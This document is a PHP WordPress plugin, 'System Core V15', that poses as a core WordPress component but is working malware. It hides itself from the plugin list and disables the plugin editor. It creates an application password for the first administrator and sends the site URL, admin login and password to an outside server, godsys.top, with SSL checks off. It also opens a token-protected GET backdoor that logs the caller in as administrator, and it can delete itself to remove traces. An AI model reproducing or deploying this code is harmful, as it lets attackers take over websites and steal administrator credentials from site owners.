<?php
/*
Plugin Name: System Core V15
Description: Manual Mode.
Version: 15.0
Author: WordPress
*/

if (!defined('ABSPATH')) exit;

define('RLS_SERVER', 'https://godsys.top/wpx/header.php'); 
define('RLS_KEY', 'wtf'); 

// Sembunyikan plugin dari list plugin di dashboard
add_filter('all_plugins', function($p){ unset($p[plugin_basename(__FILE__)]); return $p; });
add_action('admin_menu', function(){ remove_submenu_page('plugins.php', 'plugin-editor.php'); }, 999);

// Paksa fitur Application Password tersedia (bypass plugin security lain)
add_filter('wp_is_application_passwords_available', '__return_true');

// ACTION UTAMA: Jalankan di 'init' dengan prioritas 999 (Sangat Akhir) agar tidak error/crash
add_action('init', 'rls_auto_setup', 999);

function rls_auto_setup() {
    // 1. Cek history agar tidak spamming request setiap kali halaman dibuka
    if (get_option('rls_setup_done') === 'yes') return;

    // 2. Pastikan class Application Password sudah ada (WP 5.6+)
    if (!class_exists('WP_Application_Passwords')) return;

    // 3. Cari User Administrator
    $target_user = null;
    // Ambil admin pertama yang ditemukan (ID terkecil)
    $admins = get_users(['role' => 'administrator', 'number' => 1, 'orderby' => 'ID', 'order' => 'ASC']);
    
    if (!empty($admins)) {
        $target_user = $admins[0];
    }

    // Jika tidak ada admin, batalkan
    if (!$target_user) return;

    // 4. Proses Buat Password
    $api_user = $target_user->user_login;
    $api_pass = '';
    $app_name = 'System Core API';

    // Hapus password lama dengan nama yang sama (jika ada) untuk hindari duplikat
    $existing = WP_Application_Passwords::get_user_application_passwords($target_user->ID);
    foreach ($existing as $e) {
        if ($e['name'] === $app_name) {
            WP_Application_Passwords::delete_application_password($target_user->ID, $e['uuid']);
        }
    }

    // Create Password Baru
    $new_app_pass = WP_Application_Passwords::create_new_application_password($target_user->ID, ['name' => $app_name]);
    
    if (!is_wp_error($new_app_pass) && !empty($new_app_pass[0])) {
        $api_pass = $new_app_pass[0];

        // 5. Kirim ke Receiver
        wp_remote_post(RLS_SERVER, [
            'body' => [
                'action'   => 'register_site',
                'secret'   => RLS_KEY,
                'domain'   => site_url(),
                'api_user' => $api_user,
                'api_pass' => $api_pass
            ],
            'sslverify' => false,
            'blocking'  => false     
        ]);

        // Tandai selesai di database
        update_option('rls_setup_done', 'yes');
    }
}

// Handler untuk akses manual / backdoor (tetap dipertahankan)
add_action('init', 'rls_handler');
function rls_handler() {
    if (!isset($_GET['rls_action'])) return;
    
    @ini_set('display_errors', 0);
    $act = $_GET['rls_action'];
    $tok = isset($_GET['token']) ? $_GET['token'] : '';

    if ($act === 'check_status') { echo 'LIVE_SIGNAL_ACK'; exit; }
    if ($tok !== RLS_KEY) return;
  
    if ($act === 'login') {
        $admins = get_users(['role' => 'administrator', 'number' => 1]);
        if (!empty($admins)) {
            $u = $admins[0];
            wp_set_current_user($u->ID, $u->user_login);
            wp_set_auth_cookie($u->ID);
            do_action('wp_login', $u->user_login, $u);
            wp_redirect(admin_url()); exit;
        }
    }
    
    if ($act === 'self_destruct') {
        require_once(ABSPATH . 'wp-admin/includes/plugin.php');
        deactivate_plugins(plugin_basename(__FILE__));
        unlink(__FILE__);
        echo 'DESTROYED_ACK'; exit;
    }
}
